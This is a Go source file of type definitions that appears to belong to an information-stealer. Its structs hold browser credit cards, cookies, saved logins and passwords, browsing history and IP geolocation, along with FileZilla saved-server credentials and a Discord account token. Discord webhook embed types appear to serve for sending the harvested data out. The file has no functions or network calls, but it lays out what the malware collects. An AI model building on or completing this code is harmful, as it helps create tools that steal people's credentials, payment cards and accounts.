package core

import (
	"encoding/xml"
	"time"
)

type (
	CardStruct struct {
		Browser         string
		Name            string
		ExpirationMonth string
		ExpirationYear  string
		Value           string
		EncryptedValue  []byte
	}

	CookieStruct struct {
		Browser        string
		EncryptedValue []byte
		Host           string
		Name           string
		Path           string
		Value          string
	}

	HistoryStruct struct {
		Browser    string
		Title      string
		Url        string
		VisitCount int
		LastVisit  time.Time
	}

	IPStruct struct {
		Country     string
		CountryCode string
		City        string
		IP          string
		ISP         string
		Latitude    float64
		Longitude   float64
		Region      string
	}

	LoginStruct struct {
		Browser     string
		Username    string
		Password    string
		Url         string
		EncryptUser []byte
		EncryptPass []byte
	}

	LoggedCards struct {
		Logged []CardStruct
	}

	LoggedCookies struct {
		Logged []CookieStruct
	}

	LoggedHistory struct {
		Logged []HistoryStruct
	}

	LoggedLogins struct {
		Logged []LoginStruct
	}

	RecentServerList struct {
		XMLName    xml.Name `xml:"Zilla3"`
		AllServers Servers  `xml:"RecentServers"`
	}

	SavedServers struct {
		Servers map[int][]Server
	}

	Servers struct {
		Servers []Server `xml:"Server"`
	}

	Server struct {
		Host    string `xml:"Host"`
		Port    string `xml:"Port"`
		User    string `xml:"User"`
		Pass    string `xml:"Pass,omitempty"`
		Keyfile string `xml:"Keyfile,omitempty"`
	}

	SiteManagerList struct {
		XMLName    xml.Name `xml:"Zilla3"`
		AllServers Servers  `xml:"Servers"`
	}

	UserStruct struct {
		ID            string `json:"id"`
		Username      string `json:"username"`
		Discriminator string `json:"discriminator"`
		Email         string `json:"email"`
		Verified      bool   `json:"verified"`
		Phone         string `json:"phone,omitempty"`
		Token         string
	}

	WebhookData struct {
		AvatarURL string          `json:"avatar_url,omitempty"`
		Embeds    []*WebhookEmbed `json:"embeds,omitempty"`
		Username  string          `json:"username,omitempty"`
	}

	WebhookEmbed struct {
		URL       string          `json:"url,omitempty"`
		Timestamp string          `json:"timestamp,omitempty"`
		Colour    int             `json:"color,omitempty"`
		Footer    *EmbedFooter    `json:"footer,omitempty"`
		Image     *EmbedImage     `json:"image,omitempty"`
		Thumbnail *EmbedThumbnail `json:"thumbnail,omitempty"`
		Author    *EmbedAuthor    `json:"author,omitempty"`
		Fields    []*EmbedField   `json:"fields,omitempty"`
	}

	EmbedAuthor struct {
		Name string `json:"name,omitempty"`
	}

	EmbedField struct {
		Name   string `json:"name,omitempty"`
		Value  string `json:"value,omitempty"`
		Inline bool   `json:"inline,omitempty"`
	}

	EmbedFooter struct {
		Text    string `json:"text,omitempty"`
		IconURL string `json:"icon_url,omitempty"`
	}

	EmbedImage struct {
		URL string `json:"url,omitempty"`
	}

	EmbedThumbnail struct {
		URL string `json:"url,omitempty"`
	}
)
